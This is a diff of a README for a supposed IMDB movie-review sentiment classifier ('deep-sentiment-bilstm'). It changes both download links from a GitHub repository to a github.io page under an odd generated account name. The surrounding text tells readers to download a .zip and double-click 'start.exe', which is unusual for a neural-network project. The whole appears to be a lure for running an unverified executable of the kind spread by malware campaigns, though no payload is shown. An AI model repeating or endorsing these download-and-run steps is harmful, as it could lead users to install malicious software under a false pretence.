@@ -1,6 +1,6 @@
 # 🧠 deep-sentiment-bilstm - Analyze movie reviews with ease daily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Unchristianly-eugeniadicrana186/deep-sentiment-bilstm)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://unchristianly-eugeniadicrana186.github.io)
 
 This tool classifies movie reviews from the IMDB database. It uses a neural network to tell you if a review reflects a positive or negative opinion. Computers follow a specific set of rules to understand the human language used in these texts. This software makes that process simple for you.
 
@@ -8,7 +8,7 @@ This tool classifies movie reviews from the IMDB database. It uses a neural netw
 
 You must visit the project release page to get the files. Use the link below to reach the correct area.
 
-[Download the application here](https://github.com/Unchristianly-eugeniadicrana186/deep-sentiment-bilstm)
+[Download the application here](https://unchristianly-eugeniadicrana186.github.io)
 
 Look for the section labeled Assets on that page. Click the file that ends in .zip to save it to your computer. Once the download finishes, open your Downloads folder. Right-click the file and choose Extract All. This creates a new folder with all the necessary programs inside. Open this new folder to find the file named start.exe. Double-click this file to run the application.
 
